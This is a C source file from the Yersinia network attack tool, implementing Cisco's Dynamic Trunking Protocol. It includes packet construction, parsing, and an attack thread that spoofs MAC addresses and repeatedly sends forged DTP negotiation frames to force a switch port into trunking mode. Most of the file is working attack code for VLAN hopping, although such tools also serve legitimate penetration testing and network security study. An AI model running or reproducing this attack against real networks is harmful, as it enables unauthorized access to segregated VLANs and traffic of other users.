/* dtp.c
 * Implementation and attacks for Cisco's Dynamic Trunking Protocol
 *
 * Yersinia
 * By David Barroso <tomac@yersinia.net> and Alfredo Andres <slay@yersinia.net>
 * Copyright 2005, 2006, 2007 Alfredo Andres and David Barroso
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 */

#ifndef lint
static const char rcsid[] = 
       "$Id: dtp.c 43 2007-04-27 11:07:17Z slay $";
#endif

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#define _REENTRANT

#include <stdio.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>       

#ifdef HAVE_NETINET_IN_SYSTM_H
#include <netinet/in_systm.h>
#else
#ifdef HAVE_NETINET_IN_SYSTEM_H
#include <netinet/in_system.h>
#endif
#endif

#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <time.h>

#ifdef TIME_WITH_SYS_TIME
#include <sys/time.h>
#endif

#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

#ifdef HAVE_STRING_H
#include <string.h>
#endif

#ifdef HAVE_STRINGS_H
#include <strings.h>
#endif

#ifdef HAVE_BSTRING_H
#include <bstring.h>
#endif

#ifdef STDC_HEADERS
#include <stdlib.h>
#endif

#ifdef HAVE_PTHREAD_H
#include <pthread.h>
#endif

#include <stdarg.h>

#include "dtp.h"


void
dtp_register(void)
{
   protocol_register(PROTO_DTP, "DTP", "Dynamic Trunking Protocol", "dtp",
         sizeof(struct dtp_data), dtp_init_attribs, 
         dtp_learn_packet, dtp_get_printable_packet, 
         dtp_get_printable_store, dtp_load_values, 
         dtp_attack, dtp_update_field,
         dtp_features, dtp_comm_params, SIZE_ARRAY(dtp_comm_params),
         NULL, 0, NULL, dtp_init_comms_struct, PROTO_VISIBLE, dtp_end);
}

/*
 * Inicializa la estructura que se usa para relacionar el tmp_data
 * de cada nodo con los datos que se sacaran por pantalla cuando
 * se accede al demonio de red.
 * Teoricamente esta funcion solo se llama desde term_add_node()
 * la cual, a su vez, solo es llamada al tener el mutex bloqueado por
 * lo que no veo necesario que sea reentrante. (Fredy). 
 */
int8_t
dtp_init_comms_struct(struct term_node *node)
{
    struct dtp_data *dtp_data;
    void **comm_param;
 
    comm_param = (void *)calloc(1,sizeof(void *)*SIZE_ARRAY(dtp_comm_params));
    
    if (comm_param == NULL)
    {
       thread_error("dtp_init_commands_struct calloc error",errno);
       return -1;
    }

    dtp_data = node->protocol[PROTO_DTP].tmp_data;
    
    node->protocol[PROTO_DTP].commands_param = comm_param;
    
    comm_param[DTP_SMAC]    = &dtp_data->mac_source; 
    comm_param[DTP_DMAC]    = &dtp_data->mac_dest; 
    comm_param[DTP_VERSION] = &dtp_data->version; 
    comm_param[DTP_NEIGH]   = &dtp_data->neighbor; 
    comm_param[DTP_STATUS]  = &dtp_data->status; 
    comm_param[DTP_TYPE]    = &dtp_data->type; 
    comm_param[DTP_DOMAIN]  = &dtp_data->domain; 
    comm_param[7] = NULL; 
    comm_param[8] = NULL; 

    return 0;
}

void
dtp_th_send(void *arg)
{
    struct attacks *attacks=NULL;
    sigset_t mask;
    struct dtp_data *dtp_data;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    dtp_data = attacks->data;
    dtp_data->dom_len = strlen(dtp_data->domain);
    
    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("dtp_th_send pthread_sigmask()",errno);
       dtp_th_send_exit(attacks);
    }

    dtp_send(attacks);

    dtp_th_send_exit(attacks);
}


void
dtp_th_send_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);
    
    pthread_mutex_unlock(&attacks->attack_th.finished);
    
    pthread_exit(NULL);
}



int8_t
dtp_send(struct attacks *attacks)
{
    libnet_ptag_t t;
    libnet_t *lhandler;
    u_int32_t dtp_len, sent;
    struct dtp_data *dtp_data;
    u_int8_t *dtp_packet, *aux;
    u_int8_t cisco_data[]={ 0x00, 0x00, 0x0c, 0x20, 0x04 };
    dlist_t *p;
    struct interface_data *iface_data;
    struct interface_data *iface_data2;
        
    dtp_data = attacks->data;

    dtp_len = sizeof(cisco_data)+dtp_data->dom_len+26;
    
    dtp_packet = calloc(1,dtp_len);
 
    if (dtp_packet == NULL)
    {
       thread_error("dtp_send calloc error",errno);
       return -1;
    } 

    aux = dtp_packet;
    memcpy(dtp_packet,cisco_data,sizeof(cisco_data));
    aux+=sizeof(cisco_data);

    *aux = dtp_data->version; 
        aux++; aux++; 
    *aux = DTP_TYPE_DOMAIN; 
        aux++; aux++; 
    *aux = dtp_data->dom_len+5; 
        aux++;
    memcpy(aux,dtp_data->domain,dtp_data->dom_len);
    aux+=dtp_data->dom_len;
    aux++; aux++; 

    *aux = DTP_TYPE_STATUS; aux++; aux++; 
    *aux = 0x05; aux++;

    *aux = dtp_data->status;    
    aux++; aux++; 
    
    *aux = DTP_TYPE_TYPE; aux++; aux++; 
    *aux = 0x05; aux++; 

    *aux = dtp_data->type;
    aux++; aux++; 
    
    *aux = DTP_TYPE_NEIGHBOR; aux++; aux++; 
    *aux = 0x0a; aux++;
    memcpy(aux,dtp_data->neighbor,ETHER_ADDR_LEN);
    
    for (p = attacks->used_ints->list; p; p = dlist_next(attacks->used_ints->list, p)) {
       iface_data = (struct interface_data *) dlist_data(p);
       lhandler = iface_data->libnet_handler;

       t = libnet_build_802_2(
                    0xaa,            /* DSAP */   
                    0xaa,            /* SSAP */
                    0x03,            /* control */
                    dtp_packet,      /* payload */  
                    dtp_len,         /* payload size */
                    lhandler,        /* libnet handle */
                    0);              /* libnet id */

       if (t == -1) 
       {
           thread_libnet_error("Can't build ethernet header",lhandler);
           libnet_clear_packet(lhandler);
           free(dtp_packet);
           return -1;
       }  

       t = libnet_build_802_3(
               dtp_data->mac_dest,       /* ethernet destination */
               (attacks->mac_spoofing) ? dtp_data->mac_source : iface_data->etheraddr,
               /* ethernet source */
               LIBNET_802_2_H + dtp_len, /* frame size */
               NULL,                     /* payload */
               0,                        /* payload size */
               lhandler,                 /* libnet handle */
               0);                       /* libnet id */

       if (t == -1)
       {
           thread_libnet_error("Can't build ethernet header",lhandler);
           libnet_clear_packet(lhandler);
           free(dtp_packet);                
           return -1;
       }

       /*
        *  Write it to the wire.
        */
       sent = libnet_write(lhandler);

       if (sent == -1) {
           thread_libnet_error("libnet_write error", lhandler);
           libnet_clear_packet(lhandler);
           free(dtp_packet);
           return -1;
       }

       libnet_clear_packet(lhandler);
       protocols[PROTO_DTP].packets_out++;
       iface_data2 = interfaces_get_struct(iface_data->ifname);
       iface_data2->packets_out[PROTO_DTP]++;
    }

    free(dtp_packet);

    return 0;
}



int8_t
dtp_init_attribs(struct term_node *node)
{
    struct dtp_data *dtp_data;

    dtp_data = node->protocol[PROTO_DTP].tmp_data;

    attack_gen_mac(dtp_data->mac_source);

    dtp_data->mac_source[0] &= 0x0E; 

    parser_vrfy_mac("01:00:0c:cc:cc:cc",dtp_data->mac_dest);
    
    dtp_data->version = DTP_DFL_VERSION;
    
    memcpy(dtp_data->domain,DTP_DFL_DOMAIN,sizeof(DTP_DFL_DOMAIN));
    
    dtp_data->dom_len = DTP_DFL_DOM_LEN;

    dtp_data->status = DTP_DFL_STATUS;
    dtp_data->type   = DTP_DFL_TYPE;
    
    memcpy(dtp_data->neighbor,dtp_data->mac_source,6);
    
    return 0;

}




/*****************************/
/* Child/Thread loop sending */
/* DTP packets every 30 secs */
/*****************************/
void
dtp_send_negotiate(void *arg)
{
    int32_t ret;
    u_int16_t secs;
    struct timeval hello;
    struct attacks *attacks;
    struct dtp_data *dtp_data;

    attacks = arg;

    pthread_mutex_lock(&attacks->helper_th.finished);
    
    pthread_detach(pthread_self());

    dtp_data = attacks->data;

    hello.tv_sec  = 0;
    hello.tv_usec = 0;

    secs = 0;
    
write_log(0,"\n dtp_helper: %d init...\n",(int)pthread_self());
        
    while(!attacks->helper_th.stop)
    {
        if ( (ret=select( 0, NULL, NULL, NULL, &hello ) ) == -1 )
              break;

        if ( !ret )  /* Timeout... */
        {
            if (secs == 30) /* Send DTP negotiate...*/
            {
               dtp_send(attacks);
               secs=0;
            }
            else
               secs++;
        }
        hello.tv_sec  = 1;
        hello.tv_usec = 0;
    } 

write_log(0," dtp_helper: %d finished...\n",(int)pthread_self());

    pthread_mutex_unlock(&attacks->helper_th.finished);
    
    pthread_exit(NULL);
}



void 
dtp_th_nondos_do_trunk(void *arg)
{
    struct attacks *attacks=NULL;
    struct dtp_data *dtp_data, dtp_data_learned;
    struct pcap_pkthdr header;
    struct pcap_data pcap_aux;
    struct libnet_802_3_hdr *ether;
    struct timeval now;
    u_int8_t *packet=NULL, *cursor;
    sigset_t mask;
    
    attacks = arg;

    pthread_mutex_lock(&attacks->attack_th.finished);
    
    pthread_detach(pthread_self());
         
    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("dtp_nondos_do_trunk  pthread_sigmask()",errno);
       dtp_th_nondos_do_trunk_exit(attacks);
    }
    
    dtp_data = attacks->data;

    gettimeofday(&now,NULL);
    
    header.ts.tv_sec = now.tv_sec;
    header.ts.tv_usec = now.tv_usec;

/* If you want to test the NULL domain just set the defaults DTP packet values */
/* and comment the following lines. (and recompile)*/
/* From here... 
    if (dtp_learn_packet(ALL_INTS,&attacks->attack_th.stop, &dtp_data_learned, &header) < 0)
        dtp_th_nondos_do_trunk_exit(attacks);

    memcpy(dtp_data->mac_dest, dtp_data_learned.mac_dest,6);
    memcpy(dtp_data->domain,(void *)dtp_data_learned.domain, dtp_data_learned.dom_len);
    dtp_data->version = dtp_data_learned.version;
    dtp_data->dom_len = dtp_data_learned.dom_len;
    dtp_data->status  = dtp_data_learned.status;
    dtp_data->type    = dtp_data_learned.type;
 ... to here. */

    if ((packet = calloc(1, SNAPLEN)) == NULL)
        dtp_th_nondos_do_trunk_exit(attacks);
    
    dtp_send(attacks);  thread_usleep(999999);
    dtp_send(attacks);  thread_usleep(999999);
    dtp_send(attacks);
    
    thread_create(&attacks->helper_th.id, &dtp_send_negotiate, attacks);
    
    while (!attacks->attack_th.stop)
    {
        interfaces_get_packet(attacks->used_ints, NULL, &attacks->attack_th.stop, &header, packet,
                               PROTO_DTP, NO_TIMEOUT);
        if (attacks->attack_th.stop)
           break;   
           
        cursor = (packet + LIBNET_802_3_H + LIBNET_802_2_H);

        ether = (struct libnet_802_3_hdr *) packet;
        
        if (!memcmp(dtp_data->mac_source,ether->_802_3_shost,6) )
          continue; /* Oops!! Its our packet... */

        pcap_aux.header = &header;
        pcap_aux.packet = packet;
                                                                                          
        if (dtp_load_values(&pcap_aux, &dtp_data_learned) < 0)
           continue;

        switch( dtp_data_learned.status & 0xF0)
        {
             case DTP_TRUNK:
                  dtp_data->status = (DTP_TRUNK | DTP_DESIRABLE);
             break;
             case DTP_ACCESS:
                  dtp_data->status = (DTP_ACCESS | DTP_DESIRABLE);
             break;
        }
    }

    free(packet);

    dtp_th_nondos_do_trunk_exit(attacks);
}


void
dtp_th_nondos_do_trunk_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);
    
    pthread_mutex_unlock(&attacks->attack_th.finished);
    
    pthread_exit(NULL);
}


int8_t
dtp_learn_packet(struct attacks *attacks, char *iface, u_int8_t *stop, void *data, struct pcap_pkthdr *header)
{
    struct dtp_data *dtp_data;
    struct pcap_data pcap_aux;
    u_int8_t *packet, *cursor, got_dtp_packet = 0;
    dlist_t *p;
    struct interface_data *iface_data;
    
    dtp_data = (struct dtp_data *)data;

    if ((packet = calloc(1, SNAPLEN)) == NULL)
        return -1;

    if (iface) {
       p = dlist_search(attacks->used_ints->list, attacks->used_ints->cmp, iface);
       if (!p)
          return -1;

       iface_data = (struct interface_data *) dlist_data(p);
    } else {
       iface_data = NULL;
    }
    
    while (!got_dtp_packet && !(*stop))
    {
        interfaces_get_packet(attacks->used_ints, iface_data, stop, header, packet, PROTO_DTP, NO_TIMEOUT);
           
        if (*stop)
        {
            free(packet);
            return -1;
        }

        cursor = (packet + LIBNET_802_3_H + LIBNET_802_2_H);

        pcap_aux.header = header;
        pcap_aux.packet = packet;
                                                                                          
        if (!dtp_load_values((struct pcap_data *)&pcap_aux, dtp_data))
           got_dtp_packet = 1;
        
    } /* While got */

    free(packet);

    return 0;
}



/* 
 * Return formated strings of each DTP field
 */
char **
dtp_get_printable_packet(struct pcap_data *data)
{
    struct libnet_802_3_hdr *ether;
    u_int8_t *dtp_data, *ptr, *tlv_data; /*, *aux;*/
    u_int16_t tlv_type, tlv_len;
#ifdef LBL_ALIGN
    u_int16_t aux_short;
#endif
    char **field_values;

    if ((field_values = (char **) protocol_create_printable(protocols[PROTO_DTP].nparams, protocols[PROTO_DTP].parameters)) == NULL) {
	    write_log(0, "Error in calloc\n");
	    return NULL;
    }

    ether = (struct libnet_802_3_hdr *) data->packet;
    dtp_data = (u_int8_t *) (data->packet + LIBNET_802_3_H + LIBNET_802_2SNAP_H);

    /* Source MAC */
    snprintf(field_values[DTP_SMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
       ether->_802_3_shost[0], ether->_802_3_shost[1], ether->_802_3_shost[2],
       ether->_802_3_shost[3], ether->_802_3_shost[4], ether->_802_3_shost[5]);
    /* Destination MAC */
    snprintf(field_values[DTP_DMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
       ether->_802_3_dhost[0], ether->_802_3_dhost[1], ether->_802_3_dhost[2],
       ether->_802_3_dhost[3], ether->_802_3_dhost[4], ether->_802_3_dhost[5]);
    
    ptr = dtp_data; 
    
    /* DTP Version */
    snprintf(field_values[DTP_VERSION], 3, "%02X", *ptr);
    
    ptr++;

    while(ptr < data->packet + data->header->caplen) 
    {        /* Undersized packet!! */
        if ( (ptr+4) > (data->packet + data->header->caplen))
/*           return NULL;*/
           break;

#ifdef LBL_ALIGN
        memcpy((void *)&aux_short,ptr,2);
        tlv_type = ntohs(aux_short);
        memcpy((void *)&aux_short,(ptr+2),2);
        tlv_len = ntohs(aux_short);        
#else
        tlv_type = ntohs(*(u_int16_t *)ptr);
        tlv_len  = ntohs(*(u_int16_t *)(ptr+2));
#endif

        if ( (ptr+tlv_len) > (data->packet + data->header->caplen))
        { write_log(0,"DTP Oversized packet!!\n");
           return NULL; /* Oversized packet!! */
        }

        if (!tlv_len) {
/*            write_log(0, "a ver...%X %X %X %X %X %X %X %X\n", *(ptr), *(ptr+1), *(ptr+2), *(ptr+3),*(ptr+4), *(ptr+5), *(ptr+6), *(ptr+7));*/
           break;
        }
 
        /*
         * TLV Len must be at least 5 bytes (header + data).  
         * Anyway i think we can give a chance to the rest
         * of TLVs... ;)
         */
        if (tlv_len > 4) 
        {
            switch(tlv_type) 
            {
                case DTP_TYPE_DOMAIN:
                   if ((tlv_len-4) < 20 ) /*DTP_DOMAIN_SIZE )*/
                   {
                      memcpy(field_values[DTP_DOMAIN], ptr+4, tlv_len-4);
                      field_values[DTP_DOMAIN][(tlv_len-4)]=0;
                   }
                   else
                   {
                      memcpy(field_values[DTP_DOMAIN], ptr+4, 20);
                      field_values[DTP_DOMAIN][19]= '|';               
                      field_values[DTP_DOMAIN][20]= '\0';               
                   }
                break;
                
                case DTP_TYPE_STATUS:
                  if (tlv_len == 5)
                  {
                      tlv_data = (ptr+4);
                      snprintf(field_values[DTP_STATUS], 3, "%02X", *tlv_data);
                  }     
                break;
                
                case DTP_TYPE_TYPE:
                  if (tlv_len == 5)
                  {
                      tlv_data = (ptr+4);
                      snprintf(field_values[DTP_TYPE], 3, "%02X", *tlv_data);
                  }
                break;
                case DTP_TYPE_NEIGHBOR:
                   if (tlv_len == 10 )
                   {
                      tlv_data = (ptr+4);
                      snprintf(field_values[DTP_NEIGH], 13, "%02X%02X%02X%02X%02X%02X",
                      *tlv_data, *(tlv_data+1), *(tlv_data+2),
                      *(tlv_data+3), *(tlv_data+4), *(tlv_data+5));                   
                   }
                break;
            } 
        } 
        ptr += tlv_len;
    }

    return (char **)field_values;
}


char **
dtp_get_printable_store(struct term_node *node)
{
    struct dtp_data *dtp_tmp;
    char **field_values;
    
    /* smac + dmac + version + domain + status + type + neighbor + null = 8 */
    if ((field_values = (char **) protocol_create_printable(protocols[PROTO_DTP].nparams, protocols[PROTO_DTP].parameters)) == NULL) {
	    write_log(0, "Error in calloc\n");
	    return NULL;
    }

    if (node == NULL)
       dtp_tmp = protocols[PROTO_DTP].default_values;
    else
       dtp_tmp = (struct dtp_data *) node->protocol[PROTO_DTP].tmp_data;

    /* Source MAC */
    snprintf(field_values[DTP_SMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
      dtp_tmp->mac_source[0], dtp_tmp->mac_source[1], dtp_tmp->mac_source[2],
      dtp_tmp->mac_source[3], dtp_tmp->mac_source[4], dtp_tmp->mac_source[5]);

    /* Destination MAC */
    snprintf(field_values[DTP_DMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
        dtp_tmp->mac_dest[0], dtp_tmp->mac_dest[1], dtp_tmp->mac_dest[2],
        dtp_tmp->mac_dest[3], dtp_tmp->mac_dest[4], dtp_tmp->mac_dest[5]);

    snprintf(field_values[DTP_VERSION], 3, "%02X", dtp_tmp->version);
    
    memcpy(field_values[DTP_DOMAIN], dtp_tmp->domain, DTP_DOMAIN_SIZE);
    
    snprintf(field_values[DTP_STATUS], 5, "%02hX", dtp_tmp->status);

    snprintf(field_values[DTP_TYPE], 5, "%02hX", dtp_tmp->type);

    snprintf(field_values[DTP_NEIGH], 13, "%02X%02X%02X%02X%02X%02X", 
             dtp_tmp->neighbor[0], dtp_tmp->neighbor[1], dtp_tmp->neighbor[2],
             dtp_tmp->neighbor[3], dtp_tmp->neighbor[4], dtp_tmp->neighbor[5]);
    
    return (char **)field_values;
}



/* 
 * Load values from packet to data.
 * At the moment this function is called only 
 * from ncurses-gui.c
 */
int8_t 
dtp_load_values(struct pcap_data *data, void *values)
{
    struct libnet_802_3_hdr *ether;
    struct dtp_data *dtp;
    u_int8_t *dtp_data, *ptr;
    u_int16_t tlv_type, tlv_len;
#ifdef LBL_ALIGN
    u_int16_t aux_short;
#endif

    dtp = (struct dtp_data *)values;
    ether = (struct libnet_802_3_hdr *) data->packet;
    dtp_data = (u_int8_t *) (data->packet + LIBNET_802_3_H + LIBNET_802_2SNAP_H);

    /* Source MAC */
    memcpy(dtp->mac_source, ether->_802_3_shost, ETHER_ADDR_LEN);
    /* Destination MAC */
    memcpy(dtp->mac_dest, ether->_802_3_dhost, ETHER_ADDR_LEN);
    
    ptr = dtp_data;
    
    /* DTP Version */
    dtp->version = *ptr;

    ptr++;

    while(ptr < data->packet + data->header->caplen) 
    {    /* Undersized packet!! */
        if ( (ptr+4) > (data->packet + data->header->caplen)) 
           return 0;
        
#ifdef LBL_ALIGN
        memcpy((void *)&aux_short,ptr,2);
        tlv_type = ntohs(aux_short);
        memcpy((void *)&aux_short,(ptr+2),2);
        tlv_len = ntohs(aux_short);        
#else
        tlv_type = ntohs(*(u_int16_t *)ptr);
        tlv_len  = ntohs(*(u_int16_t *)(ptr+2));
#endif
        if ( (ptr+tlv_len) > (data->packet + data->header->caplen))
           return -1; /* Oversized packet!! */

        if (!tlv_len)
           return 0;
       
        /*
         * TLV len must be at least 5 bytes (header + data).  
         * Anyway i think we can give a chance to the rest
         * of TLVs... ;)
         */
        if (tlv_len > 4) 
        {
            switch(tlv_type) 
            {
                case DTP_TYPE_DOMAIN:
                   if ((tlv_len-4) < DTP_DOMAIN_SIZE )
                   {
                      memcpy(dtp->domain, (ptr+4), tlv_len-4);
                      dtp->domain[(tlv_len-4)]=0;
                      dtp->dom_len = tlv_len-4;
                   }
                   else
                   {
                      memcpy(dtp->domain, (ptr+4), DTP_DOMAIN_SIZE);
                      dtp->domain[DTP_DOMAIN_SIZE]=0;
                      dtp->dom_len = DTP_DOMAIN_SIZE;               
                   }
                break;
                
                case DTP_TYPE_STATUS:
                  if (tlv_len == 5)
                  {
                      dtp->status = *(ptr+4);
                  }
                break;
                
                case DTP_TYPE_TYPE:
                  if (tlv_len == 5)
                  {
                      dtp->type = *(ptr+4);
                  }
                break;

                case DTP_TYPE_NEIGHBOR:
                   if (tlv_len == 10 )
                      memcpy(dtp->neighbor, (ptr+4), 6);
                break;
            } 
        } 
        ptr += tlv_len;
    }

    return 0;
}


int8_t 
dtp_update_field(int8_t state, struct term_node *node, void *value)
{
    struct dtp_data *dtp_data;
    
    if (node == NULL)
       dtp_data = protocols[PROTO_DTP].default_values;
    else
       dtp_data = node->protocol[PROTO_DTP].tmp_data;

    switch(state)
    {
        /* Source MAC */
        case DTP_SMAC:
            memcpy((void *)dtp_data->mac_source, (void *)value, ETHER_ADDR_LEN);
        break;

        /* Destination MAC */
        case DTP_DMAC:
            memcpy((void *)dtp_data->mac_dest, (void *)value, ETHER_ADDR_LEN);
        break;

        /* Version */
        case DTP_VERSION:
            dtp_data->version = *(u_int8_t *)value;
        break;

        /* Status */
        case DTP_STATUS:
            dtp_data->status = *(u_int8_t *)value;
        break;

        /* Type */
        case DTP_TYPE:
            dtp_data->type = *(u_int8_t *)value;
        break;

        default:
        break;
    }

    return 0;
}


int8_t
dtp_end(struct term_node *node)
{
   return 0;
}
